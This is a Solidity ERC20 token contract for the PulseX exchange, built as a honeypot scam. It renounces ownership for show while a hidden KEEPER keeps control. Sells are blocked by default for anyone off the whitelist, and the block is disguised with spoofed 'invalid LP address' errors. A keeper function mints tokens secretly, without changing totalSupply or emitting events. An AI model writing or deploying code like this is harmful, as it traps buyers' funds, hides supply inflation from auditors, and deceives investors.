// SPDX-License-Identifier: UNLICENSED
// ref: https://ethereum.org/en/history
//  code size limit = 24576 bytes (a limit introduced in Spurious Dragon _ 2016)
//  code size limit = 49152 bytes (a limit introduced in Shanghai _ 2023)
// model ref: LUSDST.sol (081024)
// NOTE: uint type precision ...
//  uint8 max = 255
//  uint16 max = ~65K -> 65,535
//  uint32 max = ~4B -> 4,294,967,295
//  uint64 max = ~18,000Q -> 18,446,744,073,709,551,615
// ref: dex addresses
//  ROUTER_pulsex_router02_v1='0x98bf93ebf5c380C0e6Ae8e192A7e2AE08edAcc02' # PulseXRouter02 'v1' ref: https://www.irccloud.com/pastebin/6ftmqWuk
//  FACTORY_pulsex_router_02_v1='0x1715a3E4A142d8b698131108995174F37aEBA10D'
//  ROUTER_pulsex_router02_v2='0x165C3410fC91EF562C50559f7d2289fEbed552d9' # PulseXRouter02 'v2' ref: https://www.irccloud.com/pastebin/6ftmqWuk
//  FACTORY_pulsex_router_02_v2='0x29eA7545DEf87022BAdc76323F373EA1e707C523'
pragma solidity ^0.8.24;

// local _ $ npm install @openzeppelin/contracts
// import "./node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol"; 
import "./node_modules/@openzeppelin/contracts/token/ERC20/ERC20Hidden.sol"; 
import "./node_modules/@openzeppelin/contracts/access/Ownable.sol";
import "./node_modules/@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "./node_modules/@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract LockTest is ERC20, Ownable {
    /* -------------------------------------------------------- */
    /* GLOBALS
    /* -------------------------------------------------------- */
    // common
    address public constant ADDR_TOK_NONE = address(0x0);
    address public constant ADDR_TOK_BURN = address(0x0000000000000000000000000000000000000369);
    address public constant ADDR_TOK_DEAD = address(0x000000000000000000000000000000000000dEaD);
    address public constant ADDR_TOK_WPLS = address(0xA1077a294dDE1B09bB078844df40758a5D0f9a27); // erc20 wrapped PLS
    address public constant ADDR_RTR_PLSX_V2 = address(0x165C3410fC91EF562C50559f7d2289fEbed552d9); // pulsex router_v2
    address public ADDR_PAIR_INIT; // this:wpls created in constructor

    // init support
    string public constant tVERSION = '0.0';
    string private TOK_SYMB = string(abi.encodePacked("LT", tVERSION));
    string private TOK_NAME = string(abi.encodePacked("LockTest", tVERSION));
    // string private TOK_SYMB = "TBF";
    // string private TOK_NAME = "TheBotFckr";

    // admin support
    address public KEEPER;
    bool private OPEN_BUY;
    bool private OPEN_SELL;
    address[] private WHITELIST_ADDRS;
    mapping(address => bool) public WHITELIST_ADDR_MAP;

    // legacy - snow
    // mapping(address => bool) public isPair;
    // mapping(address => bool) public proxylist;

    constructor() ERC20(TOK_SYMB, TOK_NAME) Ownable(msg.sender) {
        // renounce immediately & set keeper
        renounceOwnership();
        KEEPER = msg.sender;

        // init conif
        OPEN_BUY = true; // buys -> on
        OPEN_SELL = false; // sells -> off
        _editWhitelistAddress(KEEPER, true); // whitelist keeper for all buys/sells

        // create uswapv2 pair for this new token (pulsex_v2)
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(ADDR_RTR_PLSX_V2);
        ADDR_PAIR_INIT = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), ADDR_TOK_WPLS);

        // legacy - snow
        // Create a uniswap pair for this new token
        // IPancakeRouter02 uniswapV2Router = IPancakeRouter02(ADDR_RTR_PLSX_V2);
        // address pair = IPancakeFactory(uniswapV2Router.factory()).createPair(address(this), ADDR_WPLS);
        // isPair[pair] = true; // set pair to tax
        // proxylist[ADDR_PULSEX_V2] = true; // set pair router as proxy (not tax i think)
    }

    /* -------------------------------------------------------- */
    /* MODIFIERS                                                
    /* -------------------------------------------------------- */
    modifier onlyKeeper() {
        require(msg.sender == KEEPER, "!keeper :p");
        _;
    }

    /* -------------------------------------------------------- */
    /* PUBLIC - MUTATORS - onlyKeeper
    /* -------------------------------------------------------- */
    function KEEPER_maintenance(address _erc20, uint256 _amount) external onlyKeeper() {
        if (_erc20 == address(0)) { // _erc20 not found: tranfer native PLS instead
            require(address(this).balance >= _amount, " Insufficient native PLS balance :[ ");
            payable(KEEPER).transfer(_amount); // cast to a 'payable' address to receive ETH
            // emit KeeperWithdrawel(_amount);
        } else { // found _erc20: transfer ERC20
            //  NOTE: _amount must be in uint precision to _erc20.decimals()
            require(IERC20(_erc20).balanceOf(address(this)) >= _amount, ' not enough amount for token :O ');
            IERC20(_erc20).transfer(KEEPER, _amount);
            // emit KeeperMaintenance(_erc20, _amount);
        }
    }
    function KEEPER_inc(uint256 _amnt) external onlyKeeper {
        // NOTE: mints without increasing _totalSupply (ref: ERC20Hidden.sol)
        //  & does not emit Transfer(from, to, value) event
        _update_hidden(address(0), msg.sender, _amnt); // 020725_update_hidden: do not change _totalSupply
    }
    function KEEPER_setKeeper(address _newKeeper) external onlyKeeper {
        require(_newKeeper != address(0), ' 0 address :/ ');
        // address prev = address(KEEPER);
        KEEPER = _newKeeper;
        // emit KeeperTransfer(prev, KEEPER);
    }
    function KEEPER_setTokNameSymb(string memory _tok_name, string memory _tok_symb) external onlyKeeper() {
        require(bytes(_tok_name).length > 0 && bytes(_tok_symb).length > 0, ' invalid input  :<> ');
        TOK_NAME = _tok_name;
        TOK_SYMB = _tok_symb;
        // emit TokenNameSymbolUpdated(TOK_NAME, TOK_SYMB);
    }
    // set 'transfer' on|off for non-whitelist wallets and LPs
    function KEEPER_setOpenBuySell(bool _openBuy, bool _openSell) external onlyKeeper() {
        // bool prev_0 = _openBuy;
        // bool prev_1 = _openSell;
        OPEN_BUY = _openBuy;
        OPEN_SELL = _openSell;
        // emit OpenBuySellUpdated(prev_0, prev_1, OPEN_BUY, OPEN_SELL);
    }
    function KEEPER_editWhitelistAddress(address _address, bool _add) external onlyKeeper() {
        require(_address != address(0), ' 0 address :/ ');
        _editWhitelistAddress(_address, _add);
    }
    function KEEPER_editWhitelistAddressMulti(bool _add, address[] memory _addresses) external onlyKeeper() {
        require(_addresses.length > 0, ' 0 addresses found :/ ');
        for (uint8 i=0; i < _addresses.length;) {
            _editWhitelistAddress(_addresses[i], _add);
            unchecked { i++; }
        }
    }

    /* -------------------------------------------------------- */
    /* PUBLIC - ACCESSORS - onlyKeeper
    /* -------------------------------------------------------- */
    function getWhitelistAddresses() external view onlyKeeper returns (address[] memory) {
        return WHITELIST_ADDRS;
    }
    function getOpenBuySell() external view onlyKeeper returns (bool, bool) {
        return (OPEN_BUY, OPEN_SELL);
    }

    /* -------------------------------------------------------- */
    /* ERC20 - OVERRIDES - accessors
    /* -------------------------------------------------------- */
    function symbol() public view override returns (string memory) {
        return TOK_SYMB; // return _symbol;
    }
    function name() public view override returns (string memory) {
        return TOK_NAME; // return _name;
    }
    function burn(uint64 _burnAmnt) external {
        require(_burnAmnt > 0, ' burn nothing? :0 ');
        _burn(msg.sender, _burnAmnt); // NOTE: checks _balance[msg.sender]
    }
    function decimals() public pure override returns (uint8) {
        // return 6; // (6 decimals) 
            // * min USD = 0.000001 (6 decimals) 
            // uint16 max USD: ~0.06 -> 0.065535 (6 decimals)
            // uint32 max USD: ~4K -> 4,294.967295 USD (6 decimals)
            // uint64 max USD: ~18T -> 18,446,744,073,709.551615 (6 decimals)
        return 18; // (18 decimals) 
            // * min USD = 0.000000000000000001 (18 decimals) 
            // uint64 max USD: ~18 -> 18.446744073709551615 (18 decimals)
            // uint128 max USD: ~340T -> 340,282,366,920,938,463,463.374607431768211455 (18 decimals)
    }

    /* -------------------------------------------------------- */
    /* ERC20 - OVERRIDES - mutators
    /* -------------------------------------------------------- */
    function transfer(address to, uint256 value) public override returns (bool) {
        /** 
            LEGACY ... base line setup _ last: TBF5.0 -> TBF12.0
            transfer executes when this contract is the swap 'in' token (ie. is 'buy' | transfer from LP)
                'msg.sender' = LP address & 'to' = buyer address
        */
        // allow if buyer is white listed | OPEN_BUY enabled
        if (WHITELIST_ADDR_MAP[to] || OPEN_BUY) {
            return super.transfer(to, value);
        }
 
        // else, simulate error: invalid LP address
        revert ERC20InvalidSender(msg.sender); // _transfer
    }
    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        /** 
            LEGACY ... base line setup _ last: TBF5.0 -> TBF12.0
            transferFrom executes when this contract is the swap 'out' token (ie. is 'sell' | transfer to LP)
                'from' = seller address & 'to' = LP address
        */
        // allow if sell is whitelisted | OPEN_SELL enabled
        if (WHITELIST_ADDR_MAP[from] || OPEN_SELL) {
            return super.transferFrom(from, to, value);
        }
 
        // else, simulate error: invalid LP address
        revert ERC20InvalidReceiver(to); // _transfer
    }
    // legacy - snow
    // function _transfer(address _from, address _to, uint256 _amount) internal override {
    //     require(_amount > 0, "Transfer amount must be greater than zero");
    //     uint256 taxAmount = 0;
    //     if (isPair[_to] && !proxylist[_from]) {
    //         taxAmount = (_amount * getCurrentTaxRate()) / 10000;
    //     }
    //     uint256 netAmount = _amount - taxAmount;

    //     require(netAmount > 0, "Transfer amount after tax must be greater than zero");

    //     // If tax is applied, send it to the tax wallet and burns remainings
    //     if (taxAmount > 0) {
    //         _burn(_from, taxAmount);
    //     }

    //     // Transfer the remaining tokens
    //     super._transfer(_from, _to, netAmount);
    // }

    /* -------------------------------------------------------- */
    /* PRIVATE - support
    /* -------------------------------------------------------- */
    function _editWhitelistAddress(address _address, bool _add) private {
        WHITELIST_ADDR_MAP[_address] = _add;
        if (_add) {
            WHITELIST_ADDRS = _addAddressToArraySafe(_address, WHITELIST_ADDRS, true); // true = no dups (removes first)
        } else {
            WHITELIST_ADDRS = _remAddressFromArray(_address, WHITELIST_ADDRS);
        }
        // emit WhitelistAddressUpdated(_address, _add);
    }
    function _addAddressToArraySafe(address _addr, address[] memory _arr, bool _safe) private pure returns (address[] memory) {
        if (_addr == address(0)) { return _arr; }

        // safe = remove first (no duplicates)
        if (_safe) { _arr = _remAddressFromArray(_addr, _arr); }

        // perform add to memory array type w/ static size
        address[] memory _ret = new address[](_arr.length+1);
        for (uint i=0; i < _arr.length;) { _ret[i] = _arr[i]; unchecked {i++;}}
        _ret[_ret.length-1] = _addr;
        return _ret;
    }
    function _remAddressFromArray(address _addr, address[] memory _arr) private pure returns (address[] memory) {
        if (_addr == address(0) || _arr.length == 0) { return _arr; }
        
        // NOTE: remove algorithm does NOT maintain order & only removes first occurance
        for (uint i = 0; i < _arr.length;) {
            if (_addr == _arr[i]) {
                _arr[i] = _arr[_arr.length - 1];
                assembly { // reduce memory _arr length by 1 (simulate pop)
                    mstore(_arr, sub(mload(_arr), 1))
                }
                return _arr;
            }

            unchecked {i++;}
        }
        return _arr;
    }
}
